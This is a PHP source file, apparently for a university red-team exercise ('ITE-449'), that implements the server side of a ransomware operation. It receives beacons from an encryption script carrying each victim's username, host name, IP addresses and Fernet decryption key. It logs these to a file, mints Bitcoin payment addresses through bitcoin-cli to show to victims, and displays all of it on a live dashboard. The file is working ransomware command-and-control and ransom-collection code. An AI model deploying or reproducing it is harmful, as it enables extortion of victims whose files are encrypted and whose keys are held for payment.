<?php
/**
 * Red team beacon receiver (ITE-449 cybersecurity exercise).
 *
 * Accepts POST data from the Python encrypt script with:
 *   - username
 *   - computer_name
 *   - internal_ip
 *   - external_ip
 *   - key (Fernet encryption key, base64)
 *   - bitcoin_address (optional; payment address shown to victim)
 *
 * Logs each beacon to beacon_log.txt (append) and returns JSON success/error.
 * When visited via browser (GET), shows a simple human-friendly view
 * of recent beacons.
 */

$log_file = __DIR__ . '/beacon_log.txt';
$bitcoin_conf = __DIR__ . '/bitcoin.conf';
$bitcoin_wallet = 'beacon';
$bitcoin_cli = (is_file(__DIR__ . '/bitcoin-cli') && is_executable(__DIR__ . '/bitcoin-cli'))
    ? escapeshellarg(__DIR__ . '/bitcoin-cli')
    : 'bitcoin-cli';

// GET ?action=new_address: return a new Bitcoin address from bitcoind (JSON).
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'new_address') {
    header('Content-Type: application/json');
    if (!is_file($bitcoin_conf)) {
        echo json_encode(['ok' => false, 'error' => 'bitcoin.conf not found']);
        exit;
    }
    $conf_escaped = escapeshellarg($bitcoin_conf);
    $wallet_escaped = escapeshellarg($bitcoin_wallet);

    // Ensure wallet exists (no-op if already created). Do this first every time.
    @shell_exec("$bitcoin_cli -conf=$conf_escaped createwallet $wallet_escaped 2>/dev/null");

    $cmd = "$bitcoin_cli -conf=$conf_escaped -rpcwallet=$wallet_escaped getnewaddress 2>&1";
    $output = @shell_exec($cmd);
    $address = $output ? trim($output) : '';

    if ($address === '' || strpos($address, 'error') !== false) {
        echo json_encode(['ok' => false, 'error' => $address ?: $output ?: 'bitcoind not ready or bitcoin-cli failed']);
        exit;
    }
    echo json_encode(['ok' => true, 'address' => $address]);
    exit;
}

// Human-friendly view for GET requests.
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');

    // Check if bitcoind is up and ready to generate addresses
    $bitcoin_status = 'unknown';
    $bitcoin_detail = '';
    if (is_file($bitcoin_conf)) {
        $conf_escaped = escapeshellarg($bitcoin_conf);
        $cmd = "$bitcoin_cli -conf=$conf_escaped getblockchaininfo 2>&1";
        $output = @shell_exec($cmd);
        if ($output !== null && $output !== '') {
            $out = @json_decode(trim($output), true);
            if (is_array($out) && isset($out['chain'])) {
                $bitcoin_status = 'ready';
                $chain = $out['chain'] ?? '';
                $blocks = $out['blocks'] ?? '';
                $verification = isset($out['verificationprogress']) ? round((float)$out['verificationprogress'] * 100, 1) : null;
                $bitcoin_detail = 'chain=' . htmlspecialchars($chain, ENT_QUOTES, 'UTF-8');
                if ($blocks !== '') $bitcoin_detail .= ', blocks=' . (int)$blocks;
                if ($verification !== null && $chain !== 'regtest') $bitcoin_detail .= ', verified=' . $verification . '%';
            } else {
                $bitcoin_status = 'not_ready';
                $bitcoin_detail = trim($output);
                if (strlen($bitcoin_detail) > 120) $bitcoin_detail = substr($bitcoin_detail, 0, 117) . '...';
            }
        } else {
            $bitcoin_status = 'not_ready';
            $bitcoin_detail = 'bitcoin-cli produced no output (bitcoind may not be running)';
        }
    } else {
        $bitcoin_status = 'not_configured';
        $bitcoin_detail = 'bitcoin.conf not found';
    }

    $entries = [];
    if (file_exists($log_file)) {
        $lines = @file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (is_array($lines)) {
            // Show up to the 50 most recent entries.
            $lines = array_slice(array_reverse($lines), 0, 50);
            foreach ($lines as $line) {
                $data = json_decode($line, true);
                if (is_array($data)) {
                    $entries[] = $data;
                }
            }
        }
    }

    ?>
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="refresh" content="1">
        <title>Beacon Receiver - ITE-449</title>
        <style>
            body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background:#0b0b10; color:#f5f5f5; margin:0; padding:2rem; }
            h1 { margin-top:0; }
            table { border-collapse: collapse; width: 100%; margin-top: 1rem; font-size: 0.9rem; }
            th, td { border: 1px solid #333; padding: 0.4rem 0.6rem; }
            th { background:#151520; }
            tr:nth-child(even) { background:#141420; }
            .mono { font-family: Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
            .pill { display:inline-block; padding:0.1rem 0.4rem; border-radius:999px; background:#222; font-size:0.75rem; }
            .btc-ready { color:#2ecc71; }
            .btc-not-ready { color:#e74c3c; }
            .btc-unknown { color:#95a5a6; }
        </style>
    </head>
    <body>
        <h1>Beacon Receiver</h1>
        <p>Endpoint is <span class="mono">POST /beacon.php</span>. This page shows the most recent beacons written to <span class="mono">beacon_log.txt</span>.</p>
        <p><strong>Bitcoin:</strong>
            <?php if ($bitcoin_status === 'ready'): ?>
                <span class="btc-ready">Up to date and ready to generate addresses</span>
                <?php if ($bitcoin_detail !== ''): ?> <span class="mono" style="font-size:0.85em;">(<?php echo $bitcoin_detail; ?>)</span><?php endif; ?>
            <?php elseif ($bitcoin_status === 'not_ready'): ?>
                <span class="btc-not-ready">Not ready</span>
                <?php if ($bitcoin_detail !== ''): ?> <span class="mono" style="font-size:0.85em;">— <?php echo htmlspecialchars($bitcoin_detail, ENT_QUOTES, 'UTF-8'); ?></span><?php endif; ?>
            <?php elseif ($bitcoin_status === 'not_configured'): ?>
                <span class="btc-not-ready">Not configured</span> <span class="mono"><?php echo htmlspecialchars($bitcoin_detail, ENT_QUOTES, 'UTF-8'); ?></span>
            <?php else: ?>
                <span class="btc-unknown">Unknown</span>
            <?php endif; ?>
        </p>
        <?php if (empty($entries)): ?>
            <p><em>No beacon entries logged yet.</em></p>
        <?php else: ?>
            <table>
                <thead>
                <tr>
                    <th>#</th>
                    <th>Timestamp</th>
                    <th>Username</th>
                    <th>Computer</th>
                    <th>Internal IP</th>
                    <th>External IP</th>
                    <th>Bitcoin address</th>
                    <th>Key</th>
                </tr>
                </thead>
                <tbody>
                <?php foreach ($entries as $idx => $e): ?>
                    <tr>
                        <td><?php echo $idx + 1; ?></td>
                        <td><?php echo htmlspecialchars((string)($e['timestamp'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['username'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['computer_name'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['internal_ip'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['external_ip'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td class="mono"><?php echo htmlspecialchars((string)($e['bitcoin_address'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td class="mono"><?php echo htmlspecialchars((string)($e['key'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}

// JSON API for POST beacons.
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$username       = isset($_POST['username'])       ? trim((string) $_POST['username'])       : '';
$computer_name  = isset($_POST['computer_name'])  ? trim((string) $_POST['computer_name'])  : '';
$internal_ip    = isset($_POST['internal_ip'])     ? trim((string) $_POST['internal_ip'])     : '';
$external_ip    = isset($_POST['external_ip'])     ? trim((string) $_POST['external_ip'])     : '';
$key            = isset($_POST['key'])            ? trim((string) $_POST['key'])            : '';
$bitcoin_address = isset($_POST['bitcoin_address']) ? trim((string) $_POST['bitcoin_address']) : '';

$missing = [];
if ($username === '')      $missing[] = 'username';
if ($computer_name === '') $missing[] = 'computer_name';
if ($internal_ip === '')   $missing[] = 'internal_ip';
if ($external_ip === '')   $missing[] = 'external_ip';
if ($key === '')           $missing[] = 'key';

if (!empty($missing)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Missing: ' . implode(', ', $missing)]);
    exit;
}

$entry = [
    'timestamp'      => date('Y-m-d H:i:s'),
    'username'       => $username,
    'computer_name'  => $computer_name,
    'internal_ip'     => $internal_ip,
    'external_ip'     => $external_ip,
    'key'             => $key,
    'bitcoin_address' => $bitcoin_address,
];

$line = json_encode($entry) . "\n";
if (@file_put_contents($log_file, $line, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Failed to write log']);
    exit;
}

echo json_encode(['ok' => true, 'logged' => $entry]);
